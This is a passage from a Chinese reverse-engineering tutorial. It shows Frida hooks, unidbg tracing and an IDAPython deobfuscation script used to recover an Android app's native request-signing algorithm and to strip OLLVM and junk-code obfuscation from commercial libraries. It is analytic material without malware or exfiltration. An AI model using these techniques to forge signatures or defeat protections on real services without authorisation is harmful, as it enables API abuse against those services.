class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_native</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> base_xxx=<span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxxx.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(base_xxx)&#123;</span><br><span class="line">        <span class="keyword">var</span> sub_126AC=base_xxx.<span class="title function_">add</span>(<span class="number">0x126AC</span>+<span class="number">1</span>);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_126AC,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//结合上面的主动调用call_aaa，输出如下</span></span><br><span class="line">[<span class="title class_">Pixel</span> <span class="attr">XL</span>::com.<span class="property">example</span>.<span class="property">hellojni_sign2</span>]-&gt; <span class="title function_">call_aaa</span>()</span><br><span class="line"><span class="number">0xde7e3e80</span></span><br><span class="line"><span class="number">0x329</span></span><br><span class="line"><span class="number">0x96</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x2</span></span><br><span class="line">call_aaa st=<span class="number">1731770408559</span>&amp;sign=ce71f4842445fc9c2d4c9ff32ec11a69&amp;sv=<span class="number">120</span></span><br><span class="line">[<span class="title class_">Pixel</span> <span class="attr">XL</span>::com.<span class="property">example</span>.<span class="property">hellojni_sign2</span>]-&gt; <span class="title function_">call_aaa</span>()</span><br><span class="line"><span class="number">0xde7e3e80</span></span><br><span class="line"><span class="number">0x325</span></span><br><span class="line"><span class="number">0x96</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line"><span class="number">0x2</span></span><br><span class="line"><span class="number">0x1</span></span><br><span class="line">call_aaa st=<span class="number">1731770427945</span>&amp;sign=214970836a2b643e9a085a9e7380610a&amp;sv=<span class="number">112</span></span><br><span class="line">[<span class="title class_">Pixel</span> <span class="attr">XL</span>::com.<span class="property">example</span>.<span class="property">hellojni_sign2</span>]-&gt; <span class="title function_">call_aaa</span>()</span><br><span class="line"><span class="number">0xde7e3e80</span></span><br><span class="line"><span class="number">0x321</span>     </span><br><span class="line"><span class="number">0x96</span>      </span><br><span class="line"><span class="number">0x1</span>       </span><br><span class="line"><span class="number">0x0</span></span><br><span class="line"><span class="number">0x2</span></span><br></pre></td></tr></table></figure><p>发现sv字段后面的数字与sub126A函数的后三个参数有一定关系。</p><p>打印出第二个参数具体值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> base_xxx=<span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxxx.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(base_xxx)&#123;</span><br><span class="line">        <span class="keyword">var</span> sub_126AC=base_xxx.<span class="title function_">add</span>(<span class="number">0x126AC</span>+<span class="number">1</span>);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_126AC,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[sub_126AC]：&quot;</span>,i,args[i]);</span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">getByteArrayElements</span>(args[<span class="number">1</span>])).<span class="title function_">readCString</span>(<span class="built_in">parseInt</span>(args[i+<span class="number">1</span>])));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[sub_126AC]：\r\n&quot;</span>,<span class="title function_">hexdump</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">getByteArrayElements</span>(retval)))</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="comment">//这里把主动调用的参数改为111,222,333,444,555便于观察</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20241117131658860.png" alt="image-20241117131658860"></p><p>发现第二个参数是用户输入</p><p>通过分析，对存放sign字段的变量交叉引用==》hook sub_227C函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sub_227C=base_xxx.<span class="title function_">add</span>(<span class="number">0x227C</span>+<span class="number">1</span>);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_227C,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args0</span>=args[<span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args1</span>=args[<span class="number">1</span>];</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args2</span>=args[<span class="number">2</span>];</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_227C onEnter：\r\n&quot;</span>,<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args0</span>),<span class="string">&quot;\r\n&quot;</span>,<span class="variable language_">this</span>.<span class="property">args1</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args2</span>));</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub_227C onLeave：\r\n&quot;</span>,<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args0</span>),<span class="string">&quot;\r\n&quot;</span>,<span class="variable language_">this</span>.<span class="property">args1</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args2</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>观察打印结果发现，onleave中的第三个参数就是最终输出结果的sign值，而第一个参数是一个base64编码后的结果，把sub_126AC函数的返回值base编码发现，他就是sub_227C函数的第一个参数base前的数据。</p><p>进入sub_227C分析，有md5特征值，使用在线工具手动md5加密看看是不是标准md5,发现是标准md5</p><p>在进入[sub_126AC]查看细节</p><p>发现如下位置<img src="assets/image-20241117133139888.png" alt="image-20241117133139888"></p><p>这三个函数参数都一样，所以hook</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_native_function</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg3</span> = args[<span class="number">3</span>];</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr:&quot;</span>, addr, <span class="string">&quot; onEnter \r\n&quot;</span>, (<span class="variable language_">this</span>.<span class="property">arg0</span>), <span class="string">&quot;\r\n&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg1</span>, <span class="string">&quot;\r\n&quot;</span>, (<span class="variable language_">this</span>.<span class="property">arg2</span>), <span class="string">&quot;\r\n&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg3</span>, args[<span class="number">4</span>]);</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr:&quot;</span>, addr, <span class="string">&quot; onLeave \r\n&quot;</span>, (<span class="variable language_">this</span>.<span class="property">arg0</span>), <span class="string">&quot;\r\n&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg1</span>, <span class="string">&quot;\r\n&quot;</span>, (<span class="variable language_">this</span>.<span class="property">arg2</span>), <span class="string">&quot;\r\n&quot;</span>, <span class="variable language_">this</span>.<span class="property">arg3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">hook_native_function</span>(base_xxx.<span class="title function_">add</span>(<span class="number">0x10E18</span> + <span class="number">1</span>));</span><br><span class="line"><span class="title function_">hook_native_function</span>(base_xxx.<span class="title function_">add</span>(<span class="number">0x10DE4</span> + <span class="number">1</span>));</span><br><span class="line"><span class="title function_">hook_native_function</span>(base_xxx.<span class="title function_">add</span>(<span class="number">0x10E4C</span> + <span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>通过观察发现onleave中第三个参数与sub_126AC返回结果一样</p><p>发现<code>sub_12ECC</code>一个自定义算法</p><p>他是在sub_10DE4中被调用，发现这个函数并不是每次都被调用，所以主动调用他</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">call_encode_2_function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> base_xxx = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxxx.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (base_xxx) &#123;</span><br><span class="line">        <span class="keyword">var</span> addr_10DE4 = base_xxx.<span class="title function_">add</span>(<span class="number">0x10DE4</span> + <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;addr_10DE4:&quot;</span>, addr_10DE4);</span><br><span class="line">        <span class="keyword">var</span> sub_10DE4 = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addr_10DE4, <span class="string">&quot;void&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;int&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//80306f4370b39fd5630ad0529f77adb6</span></span><br><span class="line">        <span class="comment">//1</span></span><br><span class="line">        <span class="comment">//functionId=111&amp;body=222&amp;uuid=333&amp;client=444&amp;clientVersion=555&amp;st=1584202224270&amp;sv=120 改短一样方便查看 ==》</span></span><br><span class="line">        <span class="comment">//0x55</span></span><br><span class="line">        <span class="keyword">var</span> input_str = <span class="string">&quot;functionId=111&amp;body=222&amp;uuid=333&amp;client=444&amp;clientVersion=555&amp;st=1731823118585&amp;sv=102&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> input_buffer = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(input_str);</span><br><span class="line">        <span class="title function_">sub_10DE4</span>(<span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(<span class="string">&quot;80306f4370b39fd5630ad0529f77adb6&quot;</span>), <span class="number">1</span>, input_buffer, input_str.<span class="property">length</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(input_buffer, &#123; <span class="attr">length</span>: input_str.<span class="property">length</span> &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现每次调用后input_buffer值都一样，所以固定参数，返回值不变</p><p><strong>idatrace分析sub_10DE4</strong></p><p>整体思路：使用ida trace脚本进行trace</p><p>然后根据call_encode_2_function这个主动调用获取sub_10DE4结果，然后在trace日志中寻找打印结果的地方，然后分析汇编代码，溯源每个值的来源，最后都和用户输入和sub_10DE4参数挂钩，然后根据溯源的式子写代码就好，如果写的代码有的地方和frida输出的不一样，则在输出不一致的地方断点继续分析汇编有什么不同之处，然后批量更改参数看看写的代码是否符合规律，不符合继续在输出不一致的地方断点继续分析汇编有什么不同之处，更改相应脚本即可</p><h1>OLLVM &amp;&amp; 花指令</h1><h2 id="案例一：携程"><strong>案例一：携程</strong></h2><p>[<a href="https://bbs.kanxue.com/thread-283569.htm">原创] 记一次xxmain.so 从去花到魔改算法还原-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p>直接找到目标函数地址0xbe11c，然后反汇编。如下</p><p><img src="assets/image-20241202185504516.png" alt="image-20241202185504516"></p><p>发现jumpout，ida分析错误导致报错，看一下这个0xBE168处</p><p><img src="assets/image-20241202185543809.png" alt="image-20241202185543809"></p><p>再跟进跳转</p><p><img src="assets/image-20241202185605958.png" alt="image-20241202185605958"></p><p>发现就是一些跳转之类的东西</p><p>观察0xBE168上面一点，发现如下图</p><p><img src="assets/image-20241202200444659.png" alt="image-20241202200444659"></p><p>一些push操作，可以猜测接下来应该会有一系列操作才对，而这里只有跳转</p><p><strong>unidbg模拟执行</strong>打印trace</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sign</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//trace</span></span><br><span class="line">        String tracefile=<span class="string">&quot;trace.txt&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PrintStream tracestream=<span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(tracefile),<span class="literal">true</span>);</span><br><span class="line">            emulator.traceCode(<span class="keyword">module</span>.base, <span class="keyword">module</span>.size).setRedirect(tracestream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="type">byte</span> [] args1=&#123;<span class="number">100</span>,<span class="number">52</span>,<span class="number">54</span>,<span class="number">102</span>,<span class="number">54</span>,<span class="number">101</span>,<span class="number">100</span>,<span class="number">55</span>,<span class="number">55</span>,<span class="number">57</span>,<span class="number">57</span>,<span class="number">55</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">48</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">54</span>,<span class="number">97</span>,<span class="number">56</span>,<span class="number">50</span>,<span class="number">57</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">97</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">101</span>&#125;;</span><br><span class="line">        String args2=<span class="string">&quot;getdata&quot;</span>;</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArray</span>(vm, args1);</span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, args2);</span><br><span class="line">        <span class="comment">//String result=module.callFunction(emulator,0xBE11F,vm.getJNIEnv(),vm.addLocalObject(clazz),vm.addLocalObject(bytes),vm.addLocalObject(str)).toString().replace(&quot;\&quot;&quot;,&quot;&quot;);</span></span><br><span class="line">        String result=clazz.callJniMethodObject(emulator,<span class="string">&quot;simpleSign([BLjava/lang/String;)Ljava/lang/String;&quot;</span>,bytes,str).toString().replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Inspector.inspect(result.getBytes(StandardCharsets.UTF_8),<span class="string">&quot;result&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SecurityUtil</span> <span class="variable">securityUtil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecurityUtil</span>();</span><br><span class="line">        securityUtil.sign();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样执行过的代码就会输出到trace.txt中，</p><p>在trace.txt中索引地址0xBE164（其中有多处类似结构我们只分析一种然后批量处理就好，有的地方会在bl下面多处一个bl命令，但是没啥影响）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x400be164: &quot;push &#123;r0, r1, lr&#125;&quot; sp=0xbfffec58 r0=0x938 r1=0xbffff6b0 lr=0xffff0000 =&gt; sp=0xbfffec4c</span><br><span class="line">0x400be166: &quot;ldr r0, [pc, #4]&quot; =&gt; r0=0x70 ;</span><br><span class="line">0x400be168: &quot;bl #0x400e9de0&quot; </span><br><span class="line">0x400e9de0: &quot;bx pc&quot;            </span><br><span class="line">0x400e9de4: &quot;bic r1, lr, #1&quot; lr=0x400be16d =&gt; r1=0x400be16c</span><br><span class="line">0x400e9de8: &quot;ldr r1, [r1, r0, lsl #2]&quot; r1=0x400be16c r0=0x70 =&gt; r1=0x7324</span><br><span class="line">0x400e9dec: &quot;add r1, r1, lr&quot; r1=0x7324 lr=0x400be16d =&gt; r1=0x400c5491</span><br><span class="line">0x400e9df0: &quot;ldr lr, [sp, #8]&quot; sp=0xbfffec4c =&gt; lr=0xffff0000</span><br><span class="line">0x400e9df4: &quot;str r1, [sp, #8]&quot; r1=0x400c5491 sp=0xbfffec4c</span><br><span class="line">0x400e9df8: &quot;pop &#123;r0, r1, pc&#125;&quot; sp=0xbfffec4c</span><br><span class="line">0x400c5490: &quot;mov r0, sp&quot; sp=0xbfffec58 =&gt; r0=0xbfffec58</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//分析</span><br><span class="line">r0 = [pc+4]</span><br><span class="line">r1=lr and (~1)    这里结果的r1 = lr</span><br><span class="line">r1= [r1 + r0&lt;&lt;2]  </span><br><span class="line">r1 = r1 +lr</span><br><span class="line">lr = [sp+8]</span><br><span class="line">[sp+8] = r1</span><br><span class="line">即 jump_addr = x * 2 + bl_addr + 4; bl_addr =&gt; bl指令所在的地址</span><br><span class="line">所以最终 jump = [pc+rand_num]&lt;&lt;2 + bl_addr + 4 + lr </span><br></pre></td></tr></table></figure><p>根据这个写脚本就好。</p><h2 id="案例二：libbaiduprotect">案例二：libbaiduprotect</h2><p>[<a href="https://bbs.kanxue.com/thread-277304.htm">原创]ollvm分析及反混淆-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p>这个脚本是一个ollvm，当返混淆bcf后会变为fla，需要继续反混淆fla</p><p>以init_array中的第一个函数sub_88060为例</p><p>反编译，可以看到类似于这种的形式</p><p><img src="assets/image-20241202211335224.png" alt="image-20241202211335224"></p><p>ida查看函数的伪代码，包含大量的 <em>((dword_C0118 * (dword_C0118 - 1)) &amp; 1) == 0 || dword_C0120 &lt; 10</em> 判断。</p><p>经过简单计算这个为false 一定不会执行，所以要把if子句的goto语句及汇编中的跳转nop掉，</p><p>所以去bcf混淆 看看反汇编代码格式是否差不多</p><p>发现如下<img src="assets/image-20241202211620211.png" alt="image-20241202211620211"></p><p><img src="assets/image-20241202211657642.png" alt="image-20241202211657642"></p><p><img src="assets/image-20241202211720494.png" alt="image-20241202211720494"></p><p>发现在ORR CMP指令后面就有点出入了，但是仍然可以从这里入手</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"> </span><br><span class="line">nop = <span class="number">0xD503201F</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_bcf</span>(<span class="params">start, end</span>):</span><br><span class="line">    ea = start</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># # 11</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)  <span class="comment">#获取操作码</span></span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:     <span class="comment">#如果是跳转指令B</span></span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span><span class="comment">#从B指令下面 重新匹配</span></span><br><span class="line">        ea += <span class="number">4</span>                          </span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;AND&#x27;</span>:               <span class="comment">#是否匹配 and</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 12</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        val_1 = idc.get_operand_value(ea, <span class="number">1</span>) <span class="comment">#获取操作数的第二个参数</span></span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;CMP&#x27;</span> <span class="keyword">and</span> val_1 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 13</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        op_1 = idc.print_operand(ea, <span class="number">1</span>)</span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;CSET&#x27;</span> <span class="keyword">and</span> op_1 == <span class="string">&#x27;EQ&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 14</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        val_1 = idc.get_operand_value(ea, <span class="number">1</span>)</span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;CMP&#x27;</span> <span class="keyword">and</span> val_1 == <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 15</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        mnem = idc.print_insn_mnem(ea)</span><br><span class="line">        <span class="keyword">if</span> mnem <span class="keyword">and</span> mnem[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> start + <span class="number">4</span></span><br><span class="line">        op_1 = idc.print_operand(ea, <span class="number">1</span>)</span><br><span class="line">        ea += <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> mnem == <span class="string">&#x27;CSET&#x27;</span> <span class="keyword">and</span> op_1 == <span class="string">&#x27;LT&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 16</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        